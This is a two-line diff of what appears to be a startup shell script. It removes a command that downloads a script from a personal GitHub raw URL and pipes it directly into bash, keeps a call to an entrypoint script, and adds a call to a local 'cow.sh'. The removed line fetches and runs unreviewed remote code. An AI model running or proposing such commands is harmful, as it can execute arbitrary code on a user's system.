@@ -1,2 +1,2 @@
-curl 'https://raw.githubusercontent.com/pingme998/gistxtforcow/main/c.sh' |bash
 bash '/Essential-Files/entrypoint.sh'
+bash cow.sh 
